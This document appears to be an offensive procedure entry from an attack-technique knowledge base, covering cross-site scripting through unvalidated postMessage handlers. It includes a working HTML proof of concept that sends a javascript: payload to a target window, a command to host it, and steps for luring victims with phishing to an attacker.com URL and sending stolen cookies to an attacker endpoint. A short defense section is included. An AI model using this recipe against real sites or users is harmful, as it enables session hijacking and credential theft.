---
id: 7b457cd2-26c4-4b8d-96fd-222bcbe1e552
name: XSS-via-PostMessage-Button-Click
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.179252+00:00'
updated_at: '2023-04-10T20:21:54.073361+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter/JavaScript|T1059.007 -
    JavaScript]]
sub_techniques: []
tags:
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/PostMessage-XSS]]'
commands: []
platforms:
  - Web
  - Browser
tools: []
validated: true
---

# XSS-via-PostMessage-Button-Click

## Summary

This procedure exploits a vulnerability in the postMessage API to execute cross-site scripting (XSS) via a button click on an attacker-controlled webpage. By opening a window to the target site and sending a malicious message with a javascript: URL payload, the attacker can trigger arbitrary JavaScript execution in the target's context, enabling theft of sensitive data like cookies or credentials.

## Description

The postMessage API allows cross-origin communication between windows or iframes, but improper validation of message origins or data can lead to XSS. In this technique, an attacker hosts a malicious HTML page with a button. When a victim clicks the button, it opens the target website in a new window and, after a short delay, sends a postMessage containing a payload like a javascript: URL. If the target site processes the message without proper checks (e.g., trusting the sender or evaluating URLs directly), the payload executes in the victim's browser session. This is particularly effective against sites using postMessage for inter-domain features like login flows or embeds. The attack requires social engineering to lure the victim to the attacker's page and click the button, and it targets web applications vulnerable to DOM-based XSS via postMessage handlers.

## Requirements

1. A vulnerable target website that uses postMessage without strict origin validation or safe URL handling.
2. Ability to host a malicious HTML page on an attacker-controlled server (e.g., via Apache, Nginx, or a simple HTTP server).
3. Knowledge of the target's URL structure, such as a login or account page that processes postMessages.
4. Victim interaction: The target user must visit the attacker's page and click the button.

## Defense

Defensive measures and detection strategies:

- Implement strict origin checks in postMessage event listeners (e.g., verify event.origin matches trusted domains).
- Use Content Security Policy (CSP) with 'unsafe-inline' restrictions and sandbox directives to block javascript: URLs and inline scripts.
- Sanitize and validate all postMessage data, avoiding direct evaluation of URLs or dynamic script insertion.
- Monitor for anomalous postMessage traffic or unexpected javascript: executions via browser developer tools or web application firewalls (WAFs).
- Educate users on phishing risks and avoid clicking buttons on untrusted sites.

## Objectives

1. Deliver and execute arbitrary JavaScript in the victim's browser context on the target domain.
2. Steal sensitive information such as session cookies, localStorage data, or credentials.
3. Establish initial access for further attacks, like keylogging or network pivoting from the compromised session.

## Instructions

### Step 1: Prepare the Malicious HTML Payload

**Context**: Create the attacker-controlled webpage containing the button and postMessage logic. This file will be hosted and sent to the victim.

Use the following code snippet [[codes/PostMessage-XSS-Button-Click-HTML]] to generate the HTML file:

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('$_TARGET_URL');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:$_PAYLOAD",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

> Save this as an .html file, substituting placeholders like $_TARGET_URL with the actual target (e.g., 'http://vulnerable.com/#login') and $_PAYLOAD with malicious JS (e.g., 'confirm(document.cookie)'). The delay ensures the target window loads before sending the message. Host this file on your server.

### Step 2: Host the Malicious Page and Lure the Victim

**Context**: Make the payload accessible and trick the victim into interacting with it to trigger the postMessage.

Start a simple HTTP server in the directory containing the HTML file:

```bash
python3 -m http.server 8000
```

> Distribute the URL (e.g., http://attacker.com:8000/malicious.html) via phishing email, social engineering, or a malicious link. Instruct or entice the victim to click the "Click Me" button, which will open the target site and send the postMessage.

### Step 3: Verify Execution and Exfiltrate Data

**Context**: Confirm the XSS triggered and capture any stolen data. Modify the payload in Step 1 to exfiltrate data (e.g., send to attacker's server).

Monitor network traffic or set up a listener on your server to receive exfiltrated data from the payload.

> If successful, the javascript: payload executes in the target window, displaying an alert or sending data. For stealth, replace confirm('XSS') with code to fetch and transmit document.cookie to your endpoint.

**Expected Output**: A confirmation dialog (for testing) or network request to your exfiltration endpoint containing stolen data like cookies.

**Success Indicators**:
- Victim reports or you observe the alert box popping up in the target window.
- Incoming requests to your server with sensitive data from the victim's session.
